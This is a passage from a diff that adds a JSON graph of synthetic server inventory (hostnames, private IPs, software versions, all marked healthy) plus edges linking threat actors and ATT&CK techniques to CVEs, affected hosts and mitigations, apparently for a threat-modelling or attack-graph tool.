+        "securityStatus": "SECURE - No active vulnerability detected",
+        "hostname": "WEB-COMP-01",
+        "configFile": "ecommerce.conf",
+        "id": "Computer 01",
+        "ram": "16 GB DDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "certbot, systemctl, htop, curl",
+        "ip": "192.168.10.101",
+        "cpu": "4 vCPU AMD EPYC 7763",
+        "label": "Software",
+        "technology": "Nginx / Node.js",
+        "version": "Ubuntu 24.04 (Kernel 6.8)",
+        "dependencies": "openssl 3.2, glibc 2.39, libpcre2",
+        "installedSoftware": "Nginx 1.25.4, Node.js v20.12.0, Express.js, PM2",
+        "environment": "Production Cloud DMZ",
+        "application": "E-Commerce Web Application",
+        "port": 443,
+        "service": "nginx-ecommerce.service",
+        "name": "Computer 01",
+        "softwareVersions": "Nginx 1.25.4, Node.js 20.12.0",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 02",
+      "properties": {
+        "purpose": "PCI-DSS compliant payment processing and vault tokenization",
+        "configPath": "/etc/payment/paygate.yaml",
+        "storage": "120 GB Encrypted NVMe",
+        "securityStatus": "SECURE - PCI Vault Encrypted",
+        "hostname": "PAY-COMP-02",
+        "configFile": "paygate.yaml",
+        "id": "Computer 02",
+        "ram": "8 GB ECC DDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Alpine Linux 3.19 (Hardened)",
+        "availableTools": "vault-cli, openssl, tcpdump",
+        "ip": "192.168.10.102",
+        "cpu": "4 vCPU Intel Xeon Platinum",
+        "label": "Software",
+        "technology": "Go / Microservice",
+        "version": "Alpine Linux 3.19",
+        "dependencies": "musl libc, libsodium 1.0.19",
+        "installedSoftware": "Go Runtime 1.22.1, Vault Agent 1.15.5, Envoy Proxy",
+        "environment": "PCI-DSS Isolated Network Zone",
+        "application": "Payment Processing Service",
+        "port": 8443,
+        "service": "payment-engine.service",
+        "name": "Computer 02",
+        "softwareVersions": "Go 1.22.1, Vault 1.15.5",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 03",
+      "properties": {
+        "purpose": "Single Sign-On (SSO), JWT issuance, and MFA policy gateway",
+        "configPath": "/opt/keycloak/conf/keycloak.conf",
+        "storage": "200 GB SSD",
+        "securityStatus": "SECURE - Zero active findings",
+        "hostname": "AUTH-COMP-03",
+        "configFile": "keycloak.conf",
+        "id": "Computer 03",
+        "ram": "16 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Rocky Linux 9.3",
+        "availableTools": "kcadm.sh, keytool, journalctl",
+        "ip": "192.168.10.103",
+        "cpu": "4 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "Keycloak / OAuth2",
+        "version": "Rocky Linux 9.3 (Blue Onyx)",
+        "dependencies": "glibc 2.34, libcrypto 3.0",
+        "installedSoftware": "Keycloak 24.0.1, OpenJDK 21, OpenSSL 3.0",
+        "environment": "Enterprise Identity Subnet",
+        "application": "Authentication & Identity Service",
+        "port": 8080,
+        "service": "keycloak.service",
+        "name": "Computer 03",
+        "softwareVersions": "Keycloak 24.0.1, Java 21.0.2",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 04",
+      "properties": {
+        "purpose": "L7 edge load balancing, rate limiting, and TLS termination",
+        "configPath": "/etc/envoy/envoy.yaml",
+        "storage": "100 GB NVMe",
+        "securityStatus": "SECURE - Edge WAF Active",
+        "hostname": "INGR-COMP-04",
+        "configFile": "envoy.yaml",
+        "id": "Computer 04",
+        "ram": "16 GB DDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Debian GNU/Linux 12",
+        "availableTools": "envoy-ctl, nftables, htop",
+        "ip": "192.168.10.104",
+        "cpu": "8 vCPU AMD EPYC 7763",
+        "label": "Software",
+        "technology": "Envoy / Traefik Proxy",
+        "version": "Debian 12 (bookworm)",
+        "dependencies": "openssl 3.0.11, glibc 2.36",
+        "installedSoftware": "Envoy Proxy 1.29.1, Coraza WAF, iptables",
+        "environment": "Edge DMZ Perimeter",
+        "application": "Public Ingress Gateway",
+        "port": 80,
+        "service": "envoy-ingress.service",
+        "name": "Computer 04",
+        "softwareVersions": "Envoy 1.29.1",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 05",
+      "properties": {
+        "purpose": "Real-time warehouse stock tracking and supplier API sync",
+        "configPath": "/srv/inventory/config.ini",
+        "storage": "250 GB SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "INV-COMP-05",
+        "configFile": "inventory.ini",
+        "id": "Computer 05",
+        "ram": "8 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "pytest, pip, gunicorn",
+        "ip": "192.168.10.105",
+        "cpu": "4 vCPU AMD Ryzen",
+        "label": "Software",
+        "technology": "Python / FastAPI",
+        "version": "Ubuntu 24.04 LTS",
+        "dependencies": "pydantic 2.6, httpx 0.27",
+        "installedSoftware": "Python 3.12.2, Uvicorn, FastAPI 0.110.0, SQLAlchemy",
+        "environment": "Corporate Supply Chain Zone",
+        "application": "Inventory Management System",
+        "port": 8000,
+        "service": "inventory-api.service",
+        "name": "Computer 05",
+        "softwareVersions": "Python 3.12.2, FastAPI 0.110.0",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 06",
+      "properties": {
+        "purpose": "High-throughput asynchronous order ingestion and event bus",
+        "configPath": "/opt/kafka/config/kraft/server.properties",
+        "storage": "1 TB SAS SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "ORDER-COMP-06",
+        "configFile": "server.properties",
+        "id": "Computer 06",
+        "ram": "32 GB ECC DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Rocky Linux 9.3",
+        "availableTools": "kafka-topics.sh, kafka-console-consumer.sh",
+        "ip": "192.168.10.106",
+        "cpu": "8 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "Apache Kafka / Java",
+        "version": "Rocky Linux 9.3",
+        "dependencies": "glibc 2.34, zstd 1.5.5",
+        "installedSoftware": "Apache Kafka 3.7.0, OpenJDK 17, KRaft",
+        "environment": "Event Pipeline Tier",
+        "application": "Order Processing Pipeline",
+        "port": 9092,
+        "service": "kafka-broker.service",
+        "name": "Computer 06",
+        "softwareVersions": "Kafka 3.7.0, Java 17.0.10",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 08",
+      "properties": {
+        "purpose": "Low-latency user session tokens and caching layer",
+        "configPath": "/etc/redis/redis.conf",
+        "storage": "80 GB SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "CACHE-COMP-08",
+        "configFile": "redis.conf",
+        "id": "Computer 08",
+        "ram": "16 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Debian GNU/Linux 12",
+        "availableTools": "redis-cli, redis-benchmark",
+        "ip": "192.168.10.108",
+        "cpu": "4 vCPU Intel Xeon",
+        "label": "Software",
+        "technology": "Redis / In-Memory",
+        "version": "Debian 12",
+        "dependencies": "jemalloc 5.3, glibc 2.36",
+        "installedSoftware": "Redis Server 7.2.4, jemalloc 5.3",
+        "environment": "Application Caching Tier",
+        "application": "Session Cache System",
+        "port": 6379,
+        "service": "redis-server.service",
+        "name": "Computer 08",
+        "softwareVersions": "Redis 7.2.4",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 09",
+      "properties": {
+        "purpose": "Automated test runner, container build system, and deployment agent",
+        "configPath": "/etc/gitlab-runner/config.toml",
+        "storage": "500 GB NVMe",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "BUILD-COMP-09",
+        "configFile": "config.toml",
+        "id": "Computer 09",
+        "ram": "32 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "docker, gitlab-runner, git, buildx",
+        "ip": "192.168.10.109",
+        "cpu": "8 vCPU AMD Ryzen",
+        "label": "Software",
+        "technology": "GitLab Runner / Docker",
+        "version": "Ubuntu 24.04 LTS",
+        "dependencies": "containerd 1.7.13, runc 1.1.12",
+        "installedSoftware": "GitLab Runner 16.9.0, Docker Engine 25.0.3, Git 2.43",
+        "environment": "DevOps & Tooling Tier",
+        "application": "DevOps CI/CD Build System",
+        "port": 8081,
+        "service": "gitlab-runner.service",
+        "name": "Computer 09",
+        "softwareVersions": "Docker 25.0.3, Runner 16.9.0",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 10",
+      "properties": {
+        "purpose": "Container orchestration control plane and pod scheduling",
+        "configPath": "/etc/kubernetes/manifests/kube-apiserver.yaml",
+        "storage": "250 GB NVMe",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "K8S-COMP-10",
+        "configFile": "kube-apiserver.yaml",
+        "id": "Computer 10",
+        "ram": "32 GB ECC DDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Fedora CoreOS 39",
+        "availableTools": "kubectl, crictl, etcdctl",
+        "ip": "192.168.10.110",
+        "cpu": "8 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "Kubernetes / containerd",
+        "version": "CoreOS 39 (Kernel 6.7)",
+        "dependencies": "runc 1.1.11, etcd 3.5.12",
+        "installedSoftware": "Kubernetes v1.29.2, containerd 1.7.12, Cilium CNI",
+        "environment": "Cloud Infrastructure VPC",
+        "application": "Kubernetes Management Node",
+        "port": 6443,
+        "service": "kubelet.service",
+        "name": "Computer 10",
+        "softwareVersions": "Kubernetes v1.29.2",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 11",
+      "properties": {
+        "purpose": "Aggregates syslog, application traces, and access audit logs",
+        "configPath": "/etc/elasticsearch/elasticsearch.yml",
+        "storage": "1.5 TB NVMe",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "LOG-COMP-11",
+        "configFile": "elasticsearch.yml",
+        "id": "Computer 11",
+        "ram": "32 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Debian GNU/Linux 12",
+        "availableTools": "curl, fluentd, elasticsearch-sql-cli",
+        "ip": "192.168.10.111",
+        "cpu": "8 vCPU Intel Xeon",
+        "label": "Software",
+        "technology": "Elasticsearch / Fluentd",
+        "version": "Debian 12",
+        "dependencies": "Java 21, glibc 2.36",
+        "installedSoftware": "Elasticsearch 8.12.2, Fluentd v1.16, OpenJDK 21",
+        "environment": "Observability Management Tier",
+        "application": "Central Logging & Telemetry",
+        "port": 9200,
+        "service": "elasticsearch.service",
+        "name": "Computer 11",
+        "softwareVersions": "Elasticsearch 8.12.2",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 12",
+      "properties": {
+        "purpose": "Intrusion detection, rootkit scanning, and SOC compliance alerts",
+        "configPath": "/var/ossec/etc/ossec.conf",
+        "storage": "1 TB SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "SIEM-COMP-12",
+        "configFile": "ossec.conf",
+        "id": "Computer 12",
+        "ram": "32 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Rocky Linux 9.3",
+        "availableTools": "wazuh-control, suricatasc, tcpdump",
+        "ip": "192.168.10.112",
+        "cpu": "8 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "Wazuh / Suricata IDS",
+        "version": "Rocky Linux 9.3",
+        "dependencies": "libpcap, pcre2, openssl 3.0",
+        "installedSoftware": "Wazuh Manager 4.7.2, Suricata 7.0.3, ClamAV",
+        "environment": "SecOps Restricted Tier",
+        "application": "Security Monitoring SIEM",
+        "port": 1514,
+        "service": "wazuh-manager.service",
+        "name": "Computer 12",
+        "softwareVersions": "Wazuh 4.7.2, Suricata 7.0.3",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 13",
+      "properties": {
+        "purpose": "Corporate SMTP transport, IMAP mailbox sync, and DKIM signing",
+        "configPath": "/etc/postfix/main.cf",
+        "storage": "500 GB SAS",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "MAIL-COMP-13",
+        "configFile": "main.cf",
+        "id": "Computer 13",
+        "ram": "16 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "postqueue, mailq, doveadm",
+        "ip": "192.168.10.113",
+        "cpu": "4 vCPU Intel Xeon",
+        "label": "Software",
+        "technology": "Postfix / Dovecot",
+        "version": "Ubuntu 24.04 LTS",
+        "dependencies": "libsasl2, libssl3, glibc 2.39",
+        "installedSoftware": "Postfix 3.8.5, Dovecot 2.3.21, OpenDKIM, SpamAssassin",
+        "environment": "Enterprise Communications Tier",
+        "application": "Corporate Email Transport",
+        "port": 25,
+        "service": "postfix.service",
+        "name": "Computer 13",
+        "softwareVersions": "Postfix 3.8.5, Dovecot 2.3.21",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 15",
+      "properties": {
+        "purpose": "Employee onboarding, benefits administration, and payroll records",
+        "configPath": "/etc/nginx/sites-available/hrportal.conf",
+        "storage": "200 GB SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "HR-COMP-15",
+        "configFile": "hrportal.conf",
+        "id": "Computer 15",
+        "ram": "8 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Debian GNU/Linux 12",
+        "availableTools": "php, artisan, composer",
+        "ip": "192.168.10.115",
+        "cpu": "4 vCPU AMD Ryzen",
+        "label": "Software",
+        "technology": "PHP / Laravel",
+        "version": "Debian 12",
+        "dependencies": "php-fpm, php-mbstring, php-xml",
+        "installedSoftware": "PHP 8.3.3, Nginx 1.24, Composer 2.7, Laravel 10.45",
+        "environment": "Internal Operations Subnet",
+        "application": "HR Records Portal",
+        "port": 443,
+        "service": "php8.3-fpm.service",
+        "name": "Computer 15",
+        "softwareVersions": "PHP 8.3.3, Laravel 10.45",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 16",
+      "properties": {
+        "purpose": "Enterprise file sharing, encrypted object storage, and docs backup",
+        "configPath": "/etc/default/minio",
+        "storage": "2 TB ZFS Pool",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "STORE-COMP-16",
+        "configFile": "minio.env",
+        "id": "Computer 16",
+        "ram": "16 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "mc (minio-client), occ, zfs",
+        "ip": "192.168.10.116",
+        "cpu": "4 vCPU Intel Core",
+        "label": "Software",
+        "technology": "Nextcloud / MinIO S3",
+        "version": "Ubuntu 24.04 LTS",
+        "dependencies": "zfs-utils, openssl 3.2",
+        "installedSoftware": "Nextcloud 28.0.3, MinIO RELEASE.2024-03-03, Apache 2.4",
+        "environment": "Storage Services Subnet",
+        "application": "File Management Storage",
+        "port": 9000,
+        "service": "minio-s3.service",
+        "name": "Computer 16",
+        "softwareVersions": "Nextcloud 28.0.3, MinIO 2024.03",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 17",
+      "properties": {
+        "purpose": "High-assurance double-entry financial ledger and audit ledger",
+        "configPath": "/opt/banking/config/ledger.properties",
+        "storage": "500 GB Encrypted NVMe",
+        "securityStatus": "SECURE - HSM Protected",
+        "hostname": "BANK-COMP-17",
+        "configFile": "ledger.properties",
+        "id": "Computer 17",
+        "ram": "32 GB ECC DDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Rocky Linux 9.3",
+        "availableTools": "pkcs11-tool, java, curl",
+        "ip": "192.168.10.117",
+        "cpu": "8 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "Java / Quarkus Financial",
+        "version": "Rocky Linux 9.3",
+        "dependencies": "libcrypto, opensc, glibc 2.34",
+        "installedSoftware": "Quarkus 3.8.1, GraalVM JDK 21, HSM PKCS#11",
+        "environment": "Financial Settlement Tier",
+        "application": "Banking Ledger Application",
+        "port": 8444,
+        "service": "banking-ledger.service",
+        "name": "Computer 17",
+        "softwareVersions": "Quarkus 3.8.1, Java 21",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 18",
+      "properties": {
+        "purpose": "Dispatches transactional emails, SMS alerts, and push notifications",
+        "configPath": "/opt/notifier/config.json",
+        "storage": "60 GB SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "NOTIF-COMP-18",
+        "configFile": "notifier.json",
+        "id": "Computer 18",
+        "ram": "4 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Alpine Linux 3.19",
+        "availableTools": "pm2, node, curl",
+        "ip": "192.168.10.118",
+        "cpu": "2 vCPU Intel Xeon",
+        "label": "Software",
+        "technology": "Node.js / Express",
+        "version": "Alpine 3.19",
+        "dependencies": "musl, libuv 1.48",
+        "installedSoftware": "Node.js 20.11.1, npm 10.2, BullMQ, Redis Client",
+        "environment": "Communications Worker Tier",
+        "application": "Notification Service",
+        "port": 3001,
+        "service": "notification-worker.service",
+        "name": "Computer 18",
+        "softwareVersions": "Node.js 20.11.1",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 19",
+      "properties": {
+        "purpose": "HIPAA-compliant patient telemetry and medical diagnostic exchange",
+        "configPath": "/etc/fhir/fhir.config.js",
+        "storage": "250 GB NVMe",
+        "securityStatus": "SECURE - HIPAA Compliant",
+        "hostname": "HLTH-COMP-19",
+        "configFile": "fhir.config.js",
+        "id": "Computer 19",
+        "ram": "16 GB DDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "curl, openssl, auditd",
+        "ip": "192.168.10.119",
+        "cpu": "6 vCPU AMD Ryzen",
+        "label": "Software",
+        "technology": "FHIR API / Node.js",
+        "version": "Ubuntu 24.04 LTS",
+        "dependencies": "openssl 3.2, glibc 2.39",
+        "installedSoftware": "HAPI FHIR Gateway 6.10, Node.js 20.12, TLS 1.3",
+        "environment": "HIPAA Secure Clinical Zone",
+        "application": "Healthcare Patient Portal",
+        "port": 8445,
+        "service": "fhir-portal.service",
+        "name": "Computer 19",
+        "softwareVersions": "FHIR 4.0.1, Node 20.12",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 20",
+      "properties": {
+        "purpose": "Ingests environmental sensors, temperature telemetry, and PLC alerts",
+        "configPath": "/etc/mosquitto/mosquitto.conf",
+        "storage": "128 GB eMMC/SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "IOT-COMP-20",
+        "configFile": "mosquitto.conf",
+        "id": "Computer 20",
+        "ram": "8 GB LPDDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Debian GNU/Linux 12",
+        "availableTools": "mosquitto_sub, mosquitto_pub, htop",
+        "ip": "192.168.10.120",
+        "cpu": "4 vCPU ARM64 / Neoverse",
+        "label": "Software",
+        "technology": "Mosquitto MQTT / C++",
+        "version": "Debian 12",
+        "dependencies": "libssl3, libc6 2.36",
+        "installedSoftware": "Eclipse Mosquitto 2.0.18, libwebsockets, C++20 daemons",
+        "environment": "Edge OT & Sensor Network",
+        "application": "IoT Sensor Ingestion Gateway",
+        "port": 1883,
+        "service": "mosquitto.service",
+        "name": "Computer 20",
+        "softwareVersions": "Mosquitto 2.0.18",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 22",
+      "properties": {
+        "purpose": "Staff backoffice control panel, feature flags, and tenant administration",
+        "configPath": "/etc/nginx/sites-available/admin.conf",
+        "storage": "150 GB SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "ADMIN-COMP-22",
+        "configFile": "admin.conf",
+        "id": "Computer 22",
+        "ram": "8 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Debian GNU/Linux 12",
+        "availableTools": "pm2, npm, nginx -t",
+        "ip": "192.168.10.122",
+        "cpu": "4 vCPU Intel Core",
+        "label": "Software",
+        "technology": "React Admin / Node.js",
+        "version": "Debian 12",
+        "dependencies": "glibc 2.36, openssl 3.0",
+        "installedSoftware": "Node.js 20.12, Nginx 1.24, Vite 5.1, React 18",
+        "environment": "Internal Staff Operations",
+        "application": "Internal Admin Application",
+        "port": 3002,
+        "service": "admin-portal.service",
+        "name": "Computer 22",
+        "softwareVersions": "Node.js 20.12, React 18.2",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 23",
+      "properties": {
+        "purpose": "High-speed columnar analytics, event aggregation, and BI warehousing",
+        "configPath": "/etc/clickhouse-server/config.xml",
+        "storage": "2 TB NVMe RAID0",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "ETL-COMP-23",
+        "configFile": "config.xml",
+        "id": "Computer 23",
+        "ram": "64 GB ECC DDR5",
+        "vulnerabilityStatus": "NONE",
+        "os": "Rocky Linux 9.3",
+        "availableTools": "clickhouse-client, clickhouse-benchmark",
+        "ip": "192.168.10.123",
+        "cpu": "16 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "ClickHouse / OLAP",
+        "version": "Rocky Linux 9.3",
+        "dependencies": "glibc 2.34, libzstd",
+        "installedSoftware": "ClickHouse 24.2.1, Vector 0.36, Apache Arrow",
+        "environment": "Analytics Big Data Tier",
+        "application": "Data Warehouse & ETL",
+        "port": 8123,
+        "service": "clickhouse-server.service",
+        "name": "Computer 23",
+        "softwareVersions": "ClickHouse 24.2.1",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 24",
+      "properties": {
+        "purpose": "Engineering knowledge base, architecture diagrams, and API docs",
+        "configPath": "/etc/nginx/conf.d/docs.conf",
+        "storage": "50 GB SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "DOCS-COMP-24",
+        "configFile": "mkdocs.conf",
+        "id": "Computer 24",
+        "ram": "4 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Alpine Linux 3.19",
+        "availableTools": "mkdocs, git, nginx",
+        "ip": "192.168.10.124",
+        "cpu": "2 vCPU Intel Xeon",
+        "label": "Software",
+        "technology": "MkDocs / Nginx",
+        "version": "Alpine 3.19",
+        "dependencies": "musl libc, openssl",
+        "installedSoftware": "Nginx 1.25.4, MkDocs Material 9.5, Python 3.11",
+        "environment": "Internal Developer Portal",
+        "application": "Documentation System",
+        "port": 8082,
+        "service": "docs-server.service",
+        "name": "Computer 24",
+        "softwareVersions": "Nginx 1.25.4, MkDocs 9.5",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 25",
+      "properties": {
+        "purpose": "Active Directory root domain controller, Kerberos auth, and Group Policy",
+        "configPath": "C:\\Windows\\NTDS\\ntds.dit",
+        "storage": "500 GB SAS RAID10",
+        "securityStatus": "SECURE - Domain Controller Enforced",
+        "hostname": "DC-COMP-25",
+        "configFile": "ntds.dit",
+        "id": "Computer 25",
+        "ram": "32 GB ECC DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Windows Server 2022 Datacenter",
+        "availableTools": "PowerShell, RSAT, Active Directory Administrative Center, dcdiag",
+        "ip": "192.168.10.125",
+        "cpu": "8 vCPU Intel Xeon Platinum",
+        "label": "Software",
+        "technology": "Windows Server 2022 AD DS",
+        "version": "Windows Server 2022 (Build 20348)",
+        "dependencies": "Active Directory Database Engine, Kerberos V5",
+        "installedSoftware": "Active Directory Domain Services, Kerberos KDC, DNS Server, Sysmon",
+        "environment": "Core Infrastructure Domain Zone",
+        "application": "Identity & Domain Controller",
+        "port": 389,
+        "service": "NTDS",
+        "name": "Computer 25",
+        "softwareVersions": "Windows Server 2022 Build 20348, AD DS",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 27",
+      "properties": {
+        "purpose": "Near-real-time payment fraud analytics and batch settlement processing",
+        "configPath": "/opt/spark/conf/spark-defaults.conf",
+        "storage": "2 TB NVMe RAID0",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "ANALYTICS-COMP-27",
+        "configFile": "spark-defaults.conf",
+        "id": "Computer 27",
+        "ram": "64 GB DDR4 ECC",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 22.04 LTS",
+        "availableTools": "spark-shell, spark-submit, hdfs",
+        "ip": "192.168.10.127",
+        "cpu": "16 vCPU Intel Xeon",
+        "label": "Software",
+        "technology": "Apache Spark / Hadoop",
+        "version": "Ubuntu 22.04",
+        "dependencies": "OpenJDK 17, Hadoop native libs",
+        "installedSoftware": "Apache Spark 3.5, Hadoop 3.3.6, OpenJDK 17",
+        "environment": "Enterprise Analytics Enclave",
+        "application": "Big Data Analytics Engine",
+        "port": 8088,
+        "service": "spark-master.service",
+        "name": "Computer 27 (Analytics Engine)",
+        "softwareVersions": "Spark 3.5, Java 17",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Computer 28",
+      "properties": {
+        "purpose": "Edge TLS termination, rate limiting, and zero-trust mutual TLS gateway",
+        "configPath": "/etc/kong/kong.conf",
+        "storage": "100 GB NVMe",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "INGRESS-COMP-28",
+        "configFile": "kong.conf",
+        "id": "Computer 28",
+        "ram": "16 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Alpine Linux 3.19",
+        "availableTools": "kong health, curl, netstat, tcpdump",
+        "ip": "192.168.10.128",
+        "cpu": "8 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "Kong / Envoy Proxy",
+        "version": "Alpine 3.19",
+        "dependencies": "OpenResty, LuaJIT, OpenSSL",
+        "installedSoftware": "Kong Gateway 3.6, Envoy 1.29, OpenSSL 3.1",
+        "environment": "Edge DMZ Ingress Layer",
+        "application": "Edge API Gateway",
+        "port": 443,
+        "service": "kong-gateway.service",
+        "name": "Computer 28 (Edge API Gateway)",
+        "softwareVersions": "Kong 3.6, Envoy 1.29",
+        "status": "HEALTHY"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "APT29",
+      "to": "T1190",
+      "label": "USES"
+    },
+    {
+      "from": "APT29",
+      "to": "T1078",
+      "label": "USES"
+    },
+    {
+      "from": "APT29",
+      "to": "WellMess",
+      "label": "USES"
+    },
+    {
+      "from": "Lazarus",
+      "to": "T1078",
+      "label": "USES"
+    },
+    {
+      "from": "Lazarus",
+      "to": "CobaltStrike",
+      "label": "USES"
+    },
+    {
+      "from": "Lazarus",
+      "to": "T1059",
+      "label": "USES"
+    },
+    {
+      "from": "Sandworm",
+      "to": "T1190",
+      "label": "USES"
+    },
+    {
+      "from": "Sandworm",
+      "to": "BlackEnergy",
+      "label": "USES"
+    },
+    {
+      "from": "FIN7",
+      "to": "T1190",
+      "label": "USES"
+    },
+    {
+      "from": "FIN7",
+      "to": "CobaltStrike",
+      "label": "USES"
+    },
+    {
+      "from": "FIN7",
+      "to": "DarkSide",
+      "label": "USES"
+    },
+    {
+      "from": "T1190",
+      "to": "CVE-2021-44228",
+      "label": "EXPLOITS"
+    },
+    {
+      "from": "T1190",
+      "to": "CVE-2023-39417",
+      "label": "EXPLOITS"
+    },
+    {
+      "from": "T1190",
+      "to": "CVE-2023-30861",
+      "label": "EXPLOITS"
+    },
+    {
+      "from": "WellMess",
+      "to": "CVE-2021-41773",
+      "label": "EXPLOITS"
+    },
+    {
+      "from": "CobaltStrike",
+      "to": "CVE-2021-44228",
+      "label": "EXPLOITS"
+    },
+    {
+      "from": "BlackEnergy",
+      "to": "CVE-2020-1472",
+      "label": "EXPLOITS"
+    },
+    {
+      "from": "DarkSide",
+      "to": "CVE-2023-23397",
+      "label": "EXPLOITS"
+    },
+    {
+      "from": "CVE-2021-41773",
+      "to": "Patch Apache 2.4.51",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2021-44228",
+      "to": "Computer 14",
+      "label": "AFFECTS"
+    },
+    {
+      "from": "CVE-2021-44228",
+      "to": "Automated Patch for CVE-2021-44228",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2021-44228",
+      "to": "Mitigation-Java-14",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2023-23397",
+      "to": "MFA Enforced",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2023-23397",
+      "to": "Automated Patch for CVE-2023-23397",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2020-1472",
+      "to": "Automated Patch for CVE-2020-1472",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2023-39417",
+      "to": "Computer 07",
+      "label": "AFFECTS"
+    },
+    {
+      "from": "CVE-2023-39417",
+      "to": "Automated Patch for CVE-2023-39417",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2023-39417",
+      "to": "Mitigation-SQL-07",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2023-30861",
+      "to": "Computer 21",
+      "label": "AFFECTS"
+    },
+    {
+      "from": "CVE-2023-30861",
+      "to": "Automated Patch for CVE-2023-30861",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "CVE-2023-30861",
+      "to": "Mitigation-Python-21",
+      "label": "HAS_MITIGATION"
+    },
+    {
+      "from": "VULN-DATABASE-CLUSTER-001",
+      "to": "Database-Cluster",
+      "label": "AFFECTS"
+    },
+    {
+      "from": "VULN-DATABASE-CLUSTER-001",
+      "to": "Patch for VULN-DATABASE-CLUSTER-001",
+      "label": "HAS_MITIGATION"
+    }
+  ]
+}
